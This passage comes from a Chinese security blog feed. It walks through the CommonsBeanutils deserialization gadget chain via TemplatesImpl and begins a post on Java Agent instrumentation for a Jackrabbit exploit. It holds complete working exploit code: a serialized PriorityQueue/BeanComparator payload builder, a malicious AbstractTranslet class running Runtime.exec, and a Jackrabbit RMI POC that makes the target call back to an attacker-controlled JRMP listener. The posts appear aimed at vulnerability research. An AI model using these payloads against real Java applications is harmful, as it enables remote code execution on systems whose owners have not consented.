<span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;狗蛋&quot;</span>);<br>person.getName();<br><br><span class="hljs-comment">//而PropertyUtils.getProperty:</span><br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;狗蛋&quot;</span>);<br> PropertyUtils.getProperty(person,<span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>TemplatesImpl 类位于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，实现了 <code>Serializable</code> 接口，因此它可以被序列化，我们来看一下漏洞触发点。</p><p>首先我们注意到该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化。</p><p><img src="https://i.mji.rip/2023/10/07/65686455e17a433872992fdb093de77e.png" alt="image-20231007151630811"></p><p>注：</p><ol><li>首先得保证_name不等于null，否则会直接返回null。</li><li>其次需要保证_class等于null，因为我们要调用<code>defineTransletClasses()</code></li><li>其次我们注意到， _ class是成员属性，他是一个Class类型的数组，数组下标为<code>_transletIndex</code>的类会在<code>getTransletInstance()</code>方法中使用<code>newInstance()</code>实例化</li></ol><p>而类中的 <code>getOutputProperties()</code> 方法调用 <code>newTransformer()</code> 方法，而 <code>newTransformer()</code> 又调用了 <code>getTransletInstance()</code> 方法。</p><p><img src="https://i.mji.rip/2023/10/07/ab4c1dab90f262e979a7fc1a911230c1.png" alt="image-20231007152857156"></p><p><img src="https://i.mji.rip/2023/10/07/e141507b0ca978a40ffdf60d5c491db0.png" alt="image-20231007152959877"></p><p>而 <code>getOutputProperties()</code> 方法就是类成员变量 <code>_outputProperties</code> 的 getter 方法。</p><p>这就给了我们调用链，那 <code>_class</code> 中的类是否可控呢？看一下调用，发现在 <code>readObject</code>、构造方法以及 <code>defineTransletClasses()</code> 中有赋值的动作。</p><p><img src="https://su18.org/post-images/1616391685378.png" alt="image-20231007152959817"></p><p>其中 <code>defineTransletClasses()</code> 在 <code>getTransletInstance()</code> 中，如果 <code>_class</code> 不为空即会被调用，看一下 <code>defineTransletClasses()</code> 的逻辑（也就是我们上面蓝色部分的第二步）：</p><p><img src="https://i.mji.rip/2023/10/07/cee6b807659f9173a90e3c6a76ec76bf.png" alt="image-20231007153438948"></p><p>代码功能解释：</p><ol><li>检查<code>_bytecodes</code>是否为空，为空则抛出异常</li><li>接着就会调用自定义的ClassLoader去加载<code>_bytecodes</code>中的byte[]。而_bytecodes也是该类的成员属性。</li><li>如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的，<code>_transletIndex</code> 设置为当前循环中的标记位，而如果是第一次调用，就是<code>_class[0]</code>。如果父类不是这个类，将会抛出异常。</li></ol><p>所以我们只需要构造一个 TemplatesImpl 类的反序列化字符串，其中 <code>_bytecodes</code> 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 <code>newInstance()</code> 实例化。再串到上面的compare中，进行间接调用<code>_outputProperties()</code>的getter方法最终形成调用。</p><p>但是我们还需要满足几个条件：</p><ul><li><code>_name</code>不为null（很简单，随便传String类型的字符串即可）</li><li><code>_tfactory</code>不为null（直接传<code>new TransformerFactoryImpl()</code>，因为在其readObject里有对_tfactory赋值，所以直接拿来用即可）</li></ul><p><img src="https://i.mji.rip/2023/10/07/a36fb17ed9dfd402bcfce78738f39a71.png" alt="image-20231007161002997"></p><p>那么好，我们先梳理一下现在的链条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator.compare() -&gt; PropertyUtils.getProperty() -&gt;  PropertyUtilsBean.getProperty() -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>而 CommonsBeanutils 利用链中核心的触发位置就是 <code>BeanComparator.compare()</code> 函数，当调用 <code>BeanComparator.compare()</code> 函数时，其内部会调用我们前面说的 <code>getProperty</code> 函数，进而调用 JavaBean 中对应属性的 getter 函数。</p><p><img src="https://i.mji.rip/2023/10/07/93d7dcc91be2fd26b7026d4dc6013aad.png" alt="image-20231007165221528"></p><p>这里会调用<code>PropertyUtils.getProperty()</code>方法 因此通过给 o1赋值构造好的templates对象，property赋值为TemplatesImpl的 outputProperties属性，即可调用 <code>TemplatesImpl.getOutputProperties()</code> 往下就是TemplatesImpl的利用链</p><p>那么往上找 哪里调用 compare()呢？可以利用CC2&#x2F;4链中用的 <code>PriorityQueue.readObject()</code></p><h3 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB</span> &#123;<br>    <span class="hljs-comment">//自定义的一个反射调用属性的方法。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setfiled</span><span class="hljs-params">(Object obj,String filedname,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(filedname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//初始化TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//_name不为null</span><br>        setfiled(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;yuanyi&quot;</span>);<br>        <span class="hljs-comment">//_bytecodes为要执行的class二进制编码</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://huanjing/exp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes  =  &#123;code&#125;;<br>        setfiled(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        <span class="hljs-comment">//_tfactory在readObject中有赋值直接抄</span><br>        setfiled(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;); 这里是为了测试前面的代码逻辑写的是否正确。</span><br>        <br>        <span class="hljs-comment">//初始化BeanComparator</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//我这里用的是PriorityQueue的一参构造方法，先传一个假的，后用反射改回真的。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br>        <span class="hljs-comment">//将真的 BeanComparator 写入 PriorityQueue 中</span><br>        setfiled(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="Test-java"><a href="#Test-java" class="headerlink" title="Test.java"></a>Test.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="链条"><a href="#链条" class="headerlink" title="链条"></a>链条</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtilsBean</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Instrument插桩技术来埋Jackrabbit的坑</title>
    <link href="/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/"/>
    <url>/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="用Java-Instrument插桩技术来埋Jackrabbit的坑"><a href="#用Java-Instrument插桩技术来埋Jackrabbit的坑" class="headerlink" title="用Java Instrument插桩技术来埋Jackrabbit的坑"></a>用Java Instrument插桩技术来埋Jackrabbit的坑</h1><h2 id="起因："><a href="#起因：" class="headerlink" title="起因："></a>起因：</h2><p>前段时间在博客上分享过Jackrabbit的反序列化漏洞，也写好了POC。因为是POC我就没有用CB链，而是用RMI的JRMP去做回连进行检测。往往最悠闲的时候就是最危险的时候。这个时候师父在复测POC的时候发现POC竟然打不了，，，，，，，师父说让我尽量在测试的时候不要在本地测。就因为这一句话，才有我们今天的文章（先附上JRMP的POC）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">targetUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://10.65.14.247:8080/rmi&quot;</span>;<br><br>String host= <span class="hljs-string">&quot;10.65.14.146&quot;</span>;<span class="hljs-comment">//回连</span><br><span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">7878</span>;<br>java.rmi.server.<span class="hljs-type">ObjID</span> <span class="hljs-variable">objId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.rmi.server.ObjID();<br>sun.rmi.transport.tcp.<span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">endpoint</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.tcp.TCPEndpoint(host, port);<br>sun.rmi.transport.<span class="hljs-type">LiveRef</span> <span class="hljs-variable">liveRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.LiveRef(objId, endpoint, <span class="hljs-literal">false</span>);<br><span class="hljs-type">UnicastRef</span> <span class="hljs-variable">unicastRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.server.UnicastRef(liveRef);<br><br><span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,unicastRef);<br><span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(targetUrl);<span class="hljs-comment">//目标地址  eg:     http://10.65.14.247:8080/rmi</span><br><br>repository.login(exp);<br></code></pre></td></tr></table></figure><p>我当时怀着忐忑的心情，重新测了一下。发现确实打不了。这时候我就在想为什么会打不通。我先给大家理一下他们之间的通信过程（假设我们在客户端开启JRMP监听）。</p><p><img src="https://i.mji.rip/2023/09/28/421c7bb331bfc66f81b90f25526cba8e.png" alt="image-20230928160652243"></p><p>解释：</p><ol><li>首先客户端先将恶意payload发送给服务端。</li><li>服务端处理后先返回<code>RemoteRepositoryxr</code>的IP和端口</li><li>客户端请求连接服务端<code>RemoteRepositoryxr</code>的IP和端口</li><li>服务端JRMP回连</li></ol><p>整体流程大概是这样的。但是问题出在了第2步。我们看看具体的代码逻辑。</p><p><img src="https://i.mji.rip/2023/09/28/03c8453cf5984c5539c4029c09785de2.png" alt="image-20230928161611082"></p><p><img src="https://i.mji.rip/2023/09/28/4113e32ad3e83ddd54e2d60a90fff846.png" alt="image-20230928161707638"></p><p>看过我之前RMI文章的朋友应该对这个类有印象。再往里跟发现来到了<code>TCPEndPoint</code>发现再构造方法赋值：</p><p><img src="https://i.mji.rip/2023/09/28/55070b03026d6e61a2a472a48c08c0c7.png" alt="image-20230928162050472"></p><p>我们可以看到两个参数的构造方法被调用，里面再调四个参数的构造方法，最后再给全局变量赋值。眼见的朋友已经发现问题了。服务端返回给我们的是IP地址是”192.168.56.1“，也就是说客户端接收到的是个私有地址，那客户端每次发起第四次请求的IP地址也就是这个私有地址。这怎么能访问到呢？？？？</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>现在我们梳理一下问题：</p><ol><li>客户端接收的IP是私有IP，没办法到达客户端</li><li>返回的端口是随机端口，所以不能发两次请求</li></ol><p>这个就是我们在本地测试能成功的原因。因为它返回的这个地址是VirtualBox的Host-Only，本地访问肯定是可以执行的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Ethernet adapter VirtualBox Host<span class="hljs-literal">-Only</span> Network:<br><br>   Connection<span class="hljs-literal">-specific</span> DNS Suffix  . :<br>   Link<span class="hljs-literal">-local</span> IPv6 Address . . . . . : fe80::b684:<span class="hljs-number">6</span>aef:<span class="hljs-number">25</span>bc:e545%<span class="hljs-number">9</span><br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">56.1</span><br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>   Default Gateway . . . . . . . . . :<br></code></pre></td></tr></table></figure><p>那我们该怎么解决这个问题呢？</p><ol><li><p>编写youdebug进行更改  （简单易操作） <a href="https://youdebug.kohsuke.org/">官网有使用方法</a></p></li><li><p>用IDEA手动对IP进行set    （不太现实，需要自动化）</p></li><li><p>利用JavaAgent+Javassist进行插桩   （正好合适）</p></li></ol><h2 id="JavaAgent"><a href="#JavaAgent" class="headerlink" title="JavaAgent"></a>JavaAgent</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p><code>JDK1.5</code>开始，<code>Java</code>新增了<code>Instrumentation(Java Agent API)</code>和<code>JVMTI(JVM Tool Interface)</code>功能，允许<code>JVM</code>在加载某个<code>class文件</code>之前对其字节码进行修改，同时也支持对已加载的<code>class(类字节码)</code>进行重新加载(<code>Retransform</code>)。</p><p>利用<code>Java Agent</code>这一特性衍生出了<code>APM(Application Performance Management，应用性能管理)</code>、<code>RASP(Runtime application self-protection，运行时应用自我保护)</code>、<code>IAST(Interactive Application Security Testing，交互式应用程序安全测试)</code>等相关产品，它们都无一例外的使用了<code>Instrumentation/JVMTI</code>的<code>API</code>来实现动态修改<code>Java类字节码</code>并插入监控或检测代码。</p><p><strong><code>Java Agent</code>有两种运行模式：</strong></p><ol><li>启动<code>Java程序</code>时添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数，如<code>java -javaagent:/data/XXX.jar LingXeTest</code>。</li><li><code>JDK1.6</code>新增了<code>attach(附加方式)</code>方式，可以对运行中的<code>Java进程</code>附加<code>Agent</code>。</li></ol><p>这两种运行方式的最大区别在于第一种方式只能在程序启动时指定<code>Agent</code>文件，而<code>attach</code>方式可以在<code>Java程序</code>运行后根据<code>进程ID</code>动态注入<code>Agent</code>到<code>JVM</code>。</p><p>Java Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（Agent模式）或<code>Agent-Class:</code>（Agent模式）配置，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Premain-Class: com.anbai.sec.agent.CrackLicenseAgent<br>Agent-Class: com.anbai.sec.agent.CrackLicenseAgent<br></code></pre></td></tr></table></figure><p>如果我们需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p><p><strong>简单来说Anegt就相当于是一个代理一样，我们知道java文件执行的时候先是.java文件被编译成.class文件，然后JVM利用类加载器加载.class文件。这样java代码才会被执行。而Agent的作用就是在加载之前先获取到.class文件，然后对其进行操作，在给他放行，让他按我们修改后的文件执行。</strong></p><p>其实最主要的就是下面两个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>我们正常java代码都有main方法，而这两个方法就是Agnet的main方法。</p><p>接收两个参数：</p><p>args：如果我们需要给Agent传入参数，就可以通过–javaagent后传入（稍后会有例子）</p><p>inst：由JVM自动传入</p><h3 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h3><p>主要看这个Instrumentation的方法（本篇主要用addTransformer方法）：</p><p><img src="https://oss.javasec.org/images/07EC4F97-CD49-41E6-95CE-FEB000325E33.png" alt="img"></p><h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p><p>示例中我们使用了<code>addTransformer</code>注册了一个我们自定义的<code>Transformer</code>到<code>Java Agent</code>，当有新的类被<code>JVM</code>加载时<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给<code>JVM</code>，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p><p><strong><code>ClassFileTransformer类代码：</code></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.instrument;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className           类名,如:java/lang/Runtime</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 字节码byte数组。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>简单讲就是，我们需要实现这个接口并重写<code>transform</code>方法。而这个<code>transform</code>方法简单来说就是给你想要的.class文件，你修改之后再把修改之后的.class文件返回给它让他继续执行（网上看了很多文章，没有一个把这个方法讲清楚的）</p><h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>概念：</p><p>Javassist 是一个开源的分析、编辑和创建Java字节码的类库. 其主要优点在于简单快速. 直接使用 java 编码的形式, 而不需要了解虚拟机指令, 就能动态改变类的结构, 或者动态生成类.</p><p>Javassist中最为重要的是<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>以及<code>CtField</code>这几个类.</p><ul><li><code>ClassPool</code>: 一个基于<code>Hashtable</code>实现的<code>CtClass</code>对象容器, 其中键是类名称, 